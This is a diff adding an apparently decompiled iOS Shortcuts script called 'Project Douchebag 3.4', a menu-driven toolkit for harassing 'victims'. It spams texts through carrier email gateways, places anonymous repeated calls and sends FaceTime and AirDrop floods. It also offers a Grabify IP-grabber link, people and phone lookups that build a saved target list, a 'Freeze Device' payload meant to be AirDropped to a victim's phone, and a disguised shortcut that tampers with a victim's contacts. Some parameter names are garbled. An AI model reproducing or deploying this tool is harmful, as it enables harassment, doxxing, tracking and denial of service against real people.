@@ -1,0 +1,551 @@
+import Shortcuts
+#Color: teal, #Icon: smileyFace
+
+alert(alert: "Welcome to Project Douchebag 3.4, originally made by ApplAddict and modified by Gingey!😈 We are NOT responsible for any damage that you do with this!🔨", tincel: $2)
+wait(seconds: 3)
+text(text: "Project Douchebag Login") >> text
+filterNotes() >> filterNotes
+if(Notes != nil) {
+	splitText(text: Notes) >> splitText
+	getItemFromList(list: Split Text, type: Last Item) >> getItemFromList
+var PASSWORD = Item from List
+	askForInput(prompt: "Welcome back!🙂 Simply login with password to gain access🚨", tyfault: $2, allowNegative: $4) >> askForInput
+	if(Ask for Input .contains ""${PASSWORD}"") {
+		menu(Welcome to Project Douchebag 3.4! 🚨 This is the main menu, select the option you prefer 📝, [TROLLS 🤬, STORE 🏪, UPDATES 🕦, DOWNGRADE ⬇️, CONTACT 🧑‍🧑‍🧒‍🧒, TUTORIAL 🦯]) {
+		case("TROLLS 🤬"):
+			menu(Welcome to Project Douchebag Reworked! 🚨 Simply select a action below and follow all instructions carefully for prank to be properly executed😈, [Spam Text Anonymous 🛡️, Spam Call Anonymous🛡️, Spam Text 💬, Spam Call 📞, Search Person 🔎, Calendar Spam📆, Dad Jokes Spam👨🏻, Spam Facetime 🎥, Spam Airdrop 💻, IP Grabber 📲, Long Message Spammer 🍆, Save Contact 📇, Freeze Device 🧊, Swap Contacts 🔄, Number Info 🔎]) {
+			case("Spam Text Anonymous 🛡️"):
+				sendNotification(body: "For this to work you MUST have the victims Carrier📲", tound: $2, attachment: $3) >> sendNotification
+				menu(Do you have the Victims carrier📲, [No, Yes]) {
+				case("No"):
+					sendNotification(body: "You will be directed to a website, simply input number and you will get the Carrier") >> sendNotification 1
+					openURL(url: "https://www.carrierlookup.com") >> openURL
+				case("Yes"):
+					askForInput(prompt: "Carrier of Victim") >> askForInput 1
+var Carrier = Provided Input
+					askForInput(prompt: "Number of victim you can NOT put in ( or - only put the numbers") >> askForInput 2
+var Number = Provided Input
+					askForInput(prompt: "How much times do you wanna spam ", type: Number) >> askForInput 3
+var Times = Provided Input
+					askForInput(prompt: "What do you want the message to be?") >> askForInput 4
+var Message = Provided Input
+					if(Carrier .contains "Verizon") {
+						text(text: "${Number}@vtext.com") >> text 1
+var Spam = Text
+					} else {
+						if(Carrier .contains "AT&T") {
+							text(text: "${Number}@txt.att.net") >> text 2
+var Spam = Text
+						} else {
+							if(Carrier .contains "T-Mobile") {
+								text(text: "${Number}@tmomail.net") >> text 3
+var Spam = Text
+							} else {
+								if(Carrier .contains "Sprint") {
+									text(text: "${Carrier}@messaging.sprintpcs.com") >> text 4
+var Spam = Text
+								} else {
+									if(Carrier .contains "Metro PCS") {
+										text(text: "${Number}@mymetropcs.com") >> text 5
+var Spam = Text
+									} else {
+										if(Carrier .contains "Boost Mobile") {
+											text(text: "${Number} @myboostmobile.com") >> text 6
+var Spam = Text
+										} else {
+											if(Carrier .contains "Cricket") {
+												text(text: "${Number} @sms.mycricket.com") >> text 7
+var Spam = Text
+											}
+										}
+									}
+								}
+							}
+						}
+					} >> IFResult
+					sendNotification(body: "Now sending ${Times}messages to ${Variable}", attachment: If Result) >> sendNotification 2
+					repeat(Times) {
+//Unable to get shortcuts action is.workflow.actions.sendemail
+					} >> RepeatResult
+				} >> MenuResult
+			case("Spam Call Anonymous🛡️"):
+				askForInput(prompt: "Input Victims number📞", tefault: $2, allowNegative: $4) >> askForInput 5
+var Victim = Provided Input
+				askForInput(prompt: "How much times⏰") >> askForInput 6
+var Times = Provided Input
+				text(text: "*67 ${Victim}") >> text 8
+				repeat(Times) {
+					call(contact: Text) >> call
+				} >> RepeatResult 1
+			case("Spam Text 💬"):
+				menu(Who do you wanna spam? 😈, [Contact, Number, Random, Name]) {
+				case("Contact"):
+					selectContact(multiple: false) >> selectContact
+var Victim = Contacts
+				case("Number"):
+					askForInput(prompt: "Input victims number 📞", tefault: $2, allowNegative: $4) >> askForInput 7
+var Victim = Provided Input
+				case("Random"):
+					filterContacts() >> filterContacts
+					getItemFromList(list: Contacts, type: Random Item) >> getItemFromList 1
+var Victim = Item from List
+				case("Name"):
+					askForInput(prompt: "Input name of Saved person📇", tefault: $2, allowNegative: $4) >> askForInput 8
+var SavedPerson = Provided Input
+					filterNotes() >> filterNotes 1
+					if(Notes != nil) {
+						splitText(text: Notes) >> splitText 1
+						getItemFromList(list: Split Text, type: Item At Index, index: "3") >> getItemFromList 2
+var Victim = Item from List
+					} else {
+						sendNotification(body: "Person either not saved or it was not typed exactly as how it is spelled or capitalized🚨", tound: $2, attachment: Notes) >> sendNotification 3
+						exit()
+						runShortcut(name: "Project Douchebag 3.4")
+					}
+				} >> MenuResult 1
+				askForInput(prompt: "What do you wanna say?💬", tefault: $2, allowNegative: $4) >> askForInput 9
+var Message = Provided Input
+				askForInput(prompt: "How much times⏰", type: Number) >> askForInput 10
+				text(text: "${Provided Input}") >> text 9
+var Times = Text
+				menu(Spam Speed?⚡️, [Normal⚡️, Slow⚡️, Fast⚡️]) {
+				case("Normal⚡️"):
+					repeat(Times) {
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+					} >> RepeatResult 2
+					sendNotification(body: "Successfully spammed victim 😈 Taking back to Troll Menu🔎", tiund: $2, attachment: Repeat Results) >> sendNotification 4
+				case("Slow⚡️"):
+					repeat(Times) {
+						wait(seconds: 3)
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+					} >> RepeatResult 3
+					sendNotification(body: "Successfully spammed victim 😈 Taking back to Troll Menu🔎", tiund: $2, attachment: Repeat Results) >> sendNotification 5
+					runShortcut(name: "Project Douchebag 2.5 1", input: Repeat Results) >> runShortcut
+				case("Fast⚡️"):
+					repeat(Times) {
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+					} >> RepeatResult 4
+					sendNotification(body: "Successfully spammed victim 😈 Taking back to Troll Menu🔎", tiund: $2, attachment: Repeat Results) >> sendNotification 6
+					runShortcut(name: "Project Douchebag 2.5 1", input: Repeat Results) >> runShortcut 1
+				} >> MenuResult 2
+			case("Spam Call 📞"):
+				menu(Who do you wanna spam? 😈, [Contact, Number, Random, Name]) {
+				case("Contact"):
+					selectContact() >> selectContact 1
+var Victim = Contacts
+				case("Number"):
+					askForInput(prompt: "Input victims number 📞", tefault: $2, allowNegative: $4) >> askForInput 11
+var Victim = Provided Input
+				case("Random"):
+					filterContacts() >> filterContacts 1
+					getItemFromList(list: Contacts, type: Random Item) >> getItemFromList 3
+var Victim = Item from List
+				case("Name"):
+					askForInput(prompt: "Input name of saved person 📇", tefault: $2, allowNegative: $4) >> askForInput 12
+var SavedPerson = Provided Input
+					filterNotes() >> filterNotes 2
+					if(Notes != nil) {
+						splitText(text: Notes) >> splitText 2
+						getItemFromList(list: Split Text, type: Item At Index, index: "3") >> getItemFromList 4
+var Victim = Item from List
+					} else {
+						sendNotification(body: "Person either not saved or it was not typed exactly as how it is spelled or capitalized🚨", tound: $2, attachment: Notes) >> sendNotification 7
+						exit()
+						runShortcut(name: "Project Douchebag 3.4")
+					}
+				} >> MenuResult 3
+				askForInput(prompt: "How much times do you wanna do this⏰", type: Number) >> askForInput 13
+var Times = Provided Input
+				repeat(Times) {
+					call(contact: Victim) >> call 1
+				} >> RepeatResult 5
+			case("Search Person 🔎"):
+				sendNotification(body: "Person MUST be over 18, and we are NOT responsible for how this information is used") >> sendNotification 8
+				wait(seconds: 3)
+				askForInput(prompt: "Input Persons name🧑‍💻", typeult: $2, allowNegative: $4) >> askForInput 14
+				text(text: "${Ask for Input}") >> text 10
+				replaceText(input: "${Text}", find: " ", replace: "-") >> replaceText
+var Person = Updated Text
+				text(text: "https://thatsthem.com/name/${Person}") >> text 11
+				urlContents(url: "${Text}") >> urlContents
+				showResult(text: "${Contents of Web Page}")
+				text(text: "${Contents of Web Page}") >> text 12
+				showResult(text: "${Text}")
+				menu(Would you like to save this person?, [Yes, No]) {
+				case("Yes"):
+					getItemFromList(list: Text, type: Item At Index, index: "35") >> getItemFromList 5
+var F001AAF9-1D57-4EF1-B66E-F015DC2026D9 = """Project Douchebag Contact:
+￼
+￼"""
+text("${F001AAF9-1D57-4EF1-B66E-F015DC2026D9}")
+					createNote(text: "${Text}") >> createNote
+				case("No"):
+				} >> MenuResult 4
+			case("Calendar Spam📆"):
+				selectContact(multiple: true) >> selectContact 2
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+			case("Dad Jokes Spam👨🏻"):
+				menu(Who do you wanna spam?😈, [Contact, Number, Random, Name]) {
+				case("Contact"):
+					selectContact() >> selectContact 3
+var Victim = Contacts
+				case("Number"):
+					askForInput(prompt: "Inputs victims number📞", tefault: $2, allowNegative: $4) >> askForInput 15
+var Victim = Provided Input
+				case("Random"):
+					filterContacts() >> filterContacts 2
+					getItemFromList(list: Contacts, type: Random Item) >> getItemFromList 6
+var Victim = Item from List
+				case("Name"):
+					askForInput(prompt: "Input name of saved person 📇", tefault: $2, allowNegative: $4) >> askForInput 16
+					filterNotes() >> filterNotes 3
+					if(Note != nil) {
+						splitText(text: Note) >> splitText 3
+						getItemFromList(list: Split Text, type: Item At Index, index: "3") >> getItemFromList 7
+var Victim = Item from List
+					} else {
+						sendNotification(body: "Person either not saved or it was not typed exactly as how it is spelled or capitalized🚨", tound: $2, attachment: Note) >> sendNotification 9
+					}
+				} >> MenuResult 5
+				askForInput(prompt: "How much times⏰", type: Number) >> askForInput 17
+var Times = Provided Input
+				url(url: "https://icanhazdadjoke.com") >> url 1
+				downloadURL(url: "${URL}", headers: ) >> downloadURL
+				valueFor(key: "joke", dictionary: Contents of URL) >> valueFor
+				repeat(Times) {
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+				} >> RepeatResult 6
+			case("Spam Facetime 🎥"):
+				selectContact(multiple: true) >> selectContact 4
+				askForInput(prompt: "How much times do you wanna do it?") >> askForInput 18
+var Times = Provided Input
+				repeat(Times) {
+					facetime(contact: Contacts) >> facetime
+				} >> RepeatResult 7
+			case("Spam Airdrop 💻"):
+				askForInput(prompt: "How much times do you wanna spam airdrop?💻", type: Number, dllowDecimal: $3, allowNegative: $4) >> askForInput 19
+var Times = Provided Input
+				selectPhoto() >> selectPhoto
+				setBluetooth()
+				repeat(Times) {
+					airdrop(file: Photos) >> airdrop
+				} >> RepeatResult 8
+				setBluetooth()
+			case("IP Grabber 📲"):
+				text(text: "https://grabify.link/track/I8I4XN") >> text 13
+				showWebPage(url: "${Text}") >> showWebPage
+			case("Long Message Spammer 🍆"):
+var 9092DAEA-3CC1-4FF6-873E-7BD979D765F6 = """PROJECT
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+DOUCHEBAG
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+WAS
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+HERE"""
+text("${9092DAEA-3CC1-4FF6-873E-7BD979D765F6}")
+var Message = Text
+				askForInput(prompt: "How much times do you wanna spam?⏰", type: Number) >> askForInput 20
+var Times = Provided Input
+				menu(Who do you wanna spam?, [Contact, Number, Random]) {
+				case("Contact"):
+					selectContact() >> selectContact 5
+					repeat(Times) {
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+					} >> RepeatResult 9
+				case("Number"):
+					askForInput(prompt: "Input victim number 📞", tefault: $2, allowNegative: $4) >> askForInput 21
+					repeat(Times) {
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+					} >> RepeatResult 10
+				case("Random"):
+					filterContacts() >> filterContacts 3
+					getItemFromList(list: Contacts, type: Random Item) >> getItemFromList 8
+					repeat(Times) {
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+					} >> RepeatResult 11
+				} >> MenuResult 6
+			case("Save Contact 📇"):
+				askForInput(prompt: "Name or Nickname for Contact 📇", tefault: $2, allowNegative: $4) >> askForInput 22
+var ContactName = Provided Input
+				askForInput(prompt: "Phone Number? 📞", tefault: $2, allowNegative: $4) >> askForInput 23
+var ContactNumber = Provided Input
+var 7546C01A-17F3-47B4-A787-7AD299F61F3E = """Project Douchebag Contact:
+￼
+￼"""
+text("${7546C01A-17F3-47B4-A787-7AD299F61F3E}")
+				createNote(text: "${Text}") >> createNote 1
+				sendNotification(body: "Contact successfully saved, when choosing who to target select "Name" and input the name you have saved ✅", attachment: Note) >> sendNotification 10
+				runShortcut(name: "Project Douchebag 3.4", input: Note) >> runShortcut 2
+			case("Freeze Device 🧊"):
+				sendNotification(body: "Victim has to restart device to fix issue, to transmit this simply airdrop it to victim 🚨", tound: $2, attachment: Ask for Input) >> sendNotification 11
+				number(value: 200) >> number
+				repeat(Number) {
+					url(url: "itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/CloudFTL/BrickMy6/master/BRICKIT.plist") >> url 2
+				} >> RepeatResult 12
+				share(file: Repeat Results)
+			case("Swap Contacts 🔄"):
+				sendNotification(body: "Victim must download and run the shortcut you send them, it is disguised and takes 2 random contacts and swaps both photo and name🚨", tound: $2, attachment: Ask for Input) >> sendNotification 12
+				selectContact() >> selectContact 6
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+			case("Number Info 🔎"):
+				sendNotification(body: "Person MUST be 18 or over for in information to show up ", attachment: Ask for Input) >> sendNotification 13
+				wait(seconds: 3)
+				askForInput(prompt: "Input Number it MUST be typed in this like this 123-456-7890 📞", tefault: $2, allowNegative: $4) >> askForInput 24
+var Victim = Ask for Input
+				text(text: "https://thatsthem.com/phone/${Victim}") >> text 14
+				urlContents(url: "${Text}") >> urlContents 1
+				text(text: "${Contents of Web Page}") >> text 15
+				showResult(text: "${Text}")
+			} >> MenuResult 7
+		case("STORE 🏪"):
+			menu(Welcome to the Shortcut Store🏪 Here you can get other cool Shortcuts🛠️, [SS IPA Libary 1 📘, Theme Installer⛰️, Link Shortener 🔗, Bee Movie Spam 🐝]) {
+			case("SS IPA Libary 1 📘"):
+				sendNotification(body: "SS IPA Libary 1, is a shortcut where you can download ipa files that allow you to get apps not on the App Store which you can download with Scarlet or Alt Store!") >> sendNotification 14
+				openURL(url: "https://www.icloud.com/shortcuts/49f885e1d83b46e3ad923c55394d331c") >> openURL 1
+			case("Theme Installer⛰️"):
+				sendNotification(body: "Theme Installer allows you to install many different themes for your iPhone via Moloko!") >> sendNotification 15
+				openURL(url: "https://www.icloud.com/shortcuts/3ba53c002b5548208602ac6e7b306f5b") >> openURL 2
+			case("Link Shortener 🔗"):
+				sendNotification(body: "Link Shortener shortcuts allows you to shorten any link via shortcuts!", attachment: Ask for Input) >> sendNotification 16
+				openURL(url: "https://www.icloud.com/shortcuts/160f5dee341a4e729cb1883fa518de28") >> openURL 3
+			case("Bee Movie Spam 🐝"):
+				sendNotification(body: "Spam your friends with the entire Bee Movie script!", attachment: Ask for Input) >> sendNotification 17
+				openURL(url: "https://www.icloud.com/shortcuts/a7b0475cc8f248398bd501a45ac0bf18") >> openURL 4
+			} >> MenuResult 8
+		case("UPDATES 🕦"):
+var 017C5B6E-D088-492A-B80C-FD478CBA2279 = """Version 3.4
+
+-New Save People System 📇
+-Contact Developer Feature 💬
+-Freeze Someones Device 🧊
+-Swap Contacts 🔄
+-Number Lookup 🔎
+-Improved Person Loookup 🔎
+-Tutorials Option 🦯
+"""
+text("${017C5B6E-D088-492A-B80C-FD478CBA2279}")
+			showResult(text: "${Text}")
+		case("DOWNGRADE ⬇️"):
+			menu(Select Version to Downgrade ↘️, [PDB 1, PDB 1.2.0, PDB 1.6.0, PDB 2.4, PDB 2.4.2, PDB 3.1]) {
+			case("PDB 1"):
+				openURL(url: "https://www.icloud.com/shortcuts/63239d67899b48f4b4afea82325b8c8c") >> openURL 5
+			case("PDB 1.2.0"):
+				openURL(url: "https://www.icloud.com/shortcuts/d246122b482e4701a5f6a9fc58980b78") >> openURL 6
+			case("PDB 1.6.0"):
+				openURL(url: "https://www.icloud.com/shortcuts/5771cacd3be447beb8ab390a2573652e") >> openURL 7
+			case("PDB 2.4"):
+				openURL(url: "https://www.icloud.com/shortcuts/2b522210259742a2b641009093d49026") >> openURL 8
+			case("PDB 2.4.2"):
+				openURL(url: "https://www.icloud.com/shortcuts/5031d0861d994afa88c0bd75f094f254") >> openURL 9
+			case("PDB 3.1"):
+				openURL(url: "https://www.icloud.com/shortcuts/f48f275818b84d2db9aced231638e5c7") >> openURL 10
+			}
+		case("CONTACT 🧑‍🧑‍🧒‍🧒"):
+			menu(Why are you contacting us?, [SUGGESTION, QUERY, NEED HELP, OTHER]) {
+			case("SUGGESTION"):
+				text(text: "Hello Project Douchebag Development Team! I am conatcting you for TOPIC of: IDEAS AND SUGGESTIONS ") >> text 16
+var Message = Text
+			case("QUERY"):
+				text(text: "Hello Project Douchebag Development Team! I am conatcting you for TOPIC of: QUESTIONS ") >> text 17
+var Message = Text
+			case("NEED HELP"):
+				text(text: "Hello Project Douchebag Development Team! I am conatcting you for TOPIC of: ASSISTANCE NEEDED ") >> text 18
+var Message = Text
+			case("OTHER"):
+				text(text: "Hello Project Douchebag Development Team! I am conatcting you for TOPIC of: OTHER TOPICS NOT ON MENU") >> text 19
+var Message = Text
+			} >> MenuResult 9
+			menu(How will you contact the Project Douchebag Team?💬, [Text, Email]) {
+			case("Text"):
+				text(text: "projectdouchebagdevelopment@gmail.com") >> text 20
+var PDBEmail = Text
+//Unable to get shortcuts action is.workflow.actions.sendmessage
+			case("Email"):
+				text(text: "projectdouchebagdevelopment@gmail.com") >> text 21
+//Unable to get shortcuts action is.workflow.actions.sendemail
+			} >> MenuResult 10
+			runShortcut(name: "Project Douchebag 3.4", input: Menu Result) >> runShortcut 3
+		case("TUTORIAL 🦯"):
+			menu(Need help with a prank? 🤬 Learn form a tutorial 🦯, [Spam Text Anonymous 🛡️, Search Person 🔎]) {
+			case("Spam Text Anonymous 🛡️"):
+				text(text: "https://i.ibb.co/PcDvWQg/F3-D14-F57-AA1-A-45-CF-81-D8-9184220-E866-E.jpg") >> text 22
+				showWebPage(url: "${Text}") >> showWebPage 1
+				text(text: "https://i.ibb.co/qJBzqb8/4-B7061-E5-1-D15-4634-A54-C-C86-D34-CACC5-D.jpg") >> text 23
+				showWebPage(url: "${Text}") >> showWebPage 2
+				text(text: "https://i.ibb.co/y6scN4N/38-F5-D59-E-1-F87-430-F-B13-C-FF28963-F56-E8.jpg") >> text 24
+				showWebPage(url: "${Text}") >> showWebPage 3
+				text(text: "https://i.ibb.co/h9kpxQr/E4-E3-F67-B-32-E0-4-FF7-8-AD6-C3-B121-A9-CFCC.jpg") >> text 25
+				showWebPage(url: "${Text}") >> showWebPage 4
+				text(text: "https://i.ibb.co/6skxq84/392-BB8-CA-95-D6-4-F88-A79-B-EAFE13922-F9-C.jpg") >> text 26
+				showWebPage(url: "${Text}") >> showWebPage 5
+				text(text: "https://i.ibb.co/LP16zzQ/C440-AC71-3071-47-C6-B31-B-6-D47170510-EF.jpg") >> text 27
+				showWebPage(url: "${Text}") >> showWebPage 6
+			case("Search Person 🔎"):
+				text(text: "https://i.ibb.co/Dpf8220/A2533-D1-D-A735-46-D5-907-F-75587-D9095-F0.jpg") >> text 28
+				showWebPage(url: "${Text}")
+				text(text: "https://i.ibb.co/XzndhHw/4325-FFF4-FA45-48-EC-99-AC-DDE8-EF5-B429-A.jpg") >> text 29
+				showWebPage(url: "${Text}")
+				text(text: "https://i.ibb.co/TrWR8b9/274-B5291-7-E49-4-AFB-84-EF-FFC5-A673-D583.jpg") >> text 30
+				showWebPage(url: "${Text}")
+				text(text: "https://i.ibb.co/8XSTTf0/E1-CD2-EFE-E670-4664-8-B89-CFCEACA8-C4-BC.jpg") >> text 31
+				showWebPage(url: "${Text}")
+			}
+		} >> MenuResult 11
+	} else {
+		sendNotification(body: "INCORRECT PASSWORD! 🚨🚨Restart🔄", titnd: $2, attachment: Ask for Input) >> sendNotification 18
+	} >> IFResult 1
+} else {
+	askForInput(prompt: "What do you want your password to be?🚨", tefault: $2, allowNegative: $4) >> askForInput 25
+var 1D896244-2437-4B39-92AB-C6D2711469B9 = """Project Douchebag Login
+￼"""
+text("${1D896244-2437-4B39-92AB-C6D2711469B9}")
+	createNote(text: "${Text}") >> createNote 2
+	runShortcut(name: "Project Douchebag 2.5", input: Note)
+} >> IFResult 2
+wait()
